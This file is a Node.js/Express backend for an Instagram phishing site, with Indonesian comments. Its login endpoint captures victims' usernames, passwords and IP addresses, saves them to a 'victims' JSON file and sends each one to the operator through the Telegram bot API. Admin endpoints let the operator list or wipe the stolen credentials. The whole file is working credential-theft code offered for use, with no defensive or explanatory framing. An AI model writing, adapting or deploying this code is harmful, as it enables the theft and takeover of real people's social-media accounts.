const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ========== KONFIGURASI ==========
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // GANTI DENGAN TOKEN BOT ANDA
const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // GANTI DENGAN CHAT ID ANDA
const ADMIN_PASSWORD = '083183';

// File penyimpanan data korban (persistent di Vercel)
const DATA_FILE = path.join('/tmp', 'victims_data.json');

// ========== FUNGSI BACA & SIMPAN DATA ==========
function loadVictims() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (err) {
        console.error('Error loading data:', err);
    }
    return [];
}

function saveVictims(victims) {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(victims, null, 2));
        return true;
    } catch (err) {
        console.error('Error saving data:', err);
        return false;
    }
}

// ========== KIRIM PESAN KE TELEGRAM ==========
async function sendToTelegram(username, password, followers, ip) {
    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return false;
    
    const message = `
🔥 *INSTAGRAM PHISHING VICTIM* 🔥

👤 *Username:* ${username}
🔑 *Password:* ${password}
📊 *Package:* ${followers} followers
🌐 *IP:* ${ip}
⏰ *Time:* ${new Date().toLocaleString('id-ID')}
    `;

    try {
        const https = require('https');
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const postData = JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const request = https.request(url, options);
        request.write(postData);
        request.end();
        return true;
    } catch (err) {
        console.error('Telegram error:', err);
        return false;
    }
}

// ========== API LOGIN (PHISHING) ==========
app.post('/api/login', async (req, res) => {
    const { username, password, followers } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.ip || 'unknown';

    if (!username || !password) {
        return res.status(400).json({ error: 'Missing credentials' });
    }

    // Simpan data korban
    const victims = loadVictims();
    const newVictim = {
        id: Date.now(),
        username: username,
        password: password,
        followers: followers || '10000',
        ip: ip,
        timestamp: new Date().toLocaleString('id-ID'),
        rawTime: Date.now()
    };
    victims.unshift(newVictim);
    saveVictims(victims);

    // Kirim ke Telegram
    await sendToTelegram(username, password, followers || '10000', ip);

    console.log(`[PHISH] ${username} | ${password} | ${followers} followers`);
    
    res.redirect('/processing.html');
});

// ========== API ADMIN - CEK LOGIN ==========
app.post('/api/admin', (req, res) => {
    const { password } = req.body;
    
    if (password === ADMIN_PASSWORD) {
        res.json({ success: true, message: 'Login berhasil' });
    } else {
        res.json({ success: false, message: 'Password salah!' });
    }
});

// ========== API GET DATA KORBAN ==========
app.get('/api/get-data', (req, res) => {
    const authPass = req.headers['x-admin-pass'];
    
    if (authPass !== ADMIN_PASSWORD) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const victims = loadVictims();
    res.json({ success: true, data: victims, total: victims.length });
});

// ========== API CLEAR DATA ==========
app.post('/api/clear-data', (req, res) => {
    const { password } = req.body;
    
    if (password !== ADMIN_PASSWORD) {
        return res.json({ success: false, message: 'Password salah!' });
    }
    
    saveVictims([]);
    res.json({ success: true, message: 'Semua data berhasil dihapus!' });
});

module.exports = app;
